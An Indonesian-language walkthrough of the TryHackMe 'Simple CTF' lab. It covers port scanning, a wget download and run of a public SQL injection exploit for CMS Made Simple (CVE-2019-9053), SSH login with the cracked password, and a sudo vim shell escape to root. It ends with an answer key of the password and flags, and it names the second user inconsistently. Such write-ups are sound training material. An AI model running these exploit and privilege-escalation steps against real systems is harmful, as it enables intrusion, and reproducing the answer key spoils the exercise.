# CTF - Simple CTF
- TryHackMe Challenge: https://tryhackme.com/room/easyctf
- IP Machine: 10.10.128.226

## Port Scanning
- Baris perintah: `nmap -sC -sV <IP Machine>`

```sh
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV 10.10.128.226   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-06 20:21 EDT
Nmap scan report for 10.10.128.226
Host is up (0.21s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.142.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
```

- Buka halaman web `http://<IP_machine>` di browser


## Gobuster
- Cari directory web menggunakan tool gobuster dengan perintah `gobuster dir -u http://<IP_Machine> -w <wordlists>`



## Gain Access
- Dari hasil tool gobuster ditemukan halaman **/simple** buka halaman tersebut di browser dengan url `http://<IP_Machine>/simple`


- Di halaman tersebut terdapat informasi bahwa halaman tersebut dibuat dengan CMS Made Simple versi 2.2.8


- Cari exploit CMS tersebut di google

- Di web https://www.exploit-db.com/exploits/46635 terdapat informasi bahwa celah keamanan CMS tersebut adalah SQL Injection (SQLi)

- Kita bisa mendownload script exploit di https://www.exploit-db.com/exploits/46635 untuk python versi 3 kita bisa mendownload script di https://github.com/e-renna/CVE-2019-9053 menggunakan wget
```sh
wget https://raw.githubusercontent.com/e-renna/CVE-2019-9053/master/exploit.py
```

- Jalankan program exploit.py dengan perintah sebagai berikut:
```sh
python3 exploit.py -u http://<IP_Machine>/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```


- Proses exploit berhasil, sekarang kita bisa menggunakan username dan password tersebut untuk mengakses SSH dengan perintah `ssh mitch@IP_Machine -p 2222`

- Setelah berhasil login, disana terdapat file **user.txt** yang berisi user flag. Baca isi dengan perintah `cat user.txt`

- Pada directory home, selain ditemukan directory **mitch** juga ditemukan directory **sunbath**


## Privilege Escalation
- Gunakan perintah `sudo -l` untuk melihat perintah yang bisa dijalankan tanpa akses root. Disini kita dapat menjalankan **vim** dengan perintah **sudo**

- Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/vim/ untuk mendapatkan akses root melalui vim

- Jalankan script diatas untuk mendapatkan akses root
```sh
sudo vim -c ':!/bin/sh'
```

- Sekarang kita tinggal membaca file root.txt sebagai root flag dengan perintah `cat /root/root.txt`



## Pertanyaan dan Jawaban:

- **Pertanyaan:** How many services are running under port 1000?
```sh
2
```

- **Pertanyaan:** What is running on the higher port?
```sh
SSH
```

- **Pertanyaan:** What's the CVE you're using against the application?
```sh
CVE-2019-9053
```

- **Pertanyaan:** To what kind of vulnerability is the application vulnerable?
```sh
SQLi
```

- **Pertanyaan:** What's the password?
```sh
secret
```

- **Pertanyaan:** Where can you login with the details obtained?
```sh
SSH
```

- **Pertanyaan:** What's the user flag?
```sh
G00d j0b, keep up!
```

- **Pertanyaan:** Is there any other user in the home directory? What's its name?
```sh
sunbatch
```

- **Pertanyaan:** What can you leverage to spawn a privileged shell?
```sh
vim
```

- **Pertanyaan:** What's the root flag?
```sh
W3ll d0n3. You made it!
```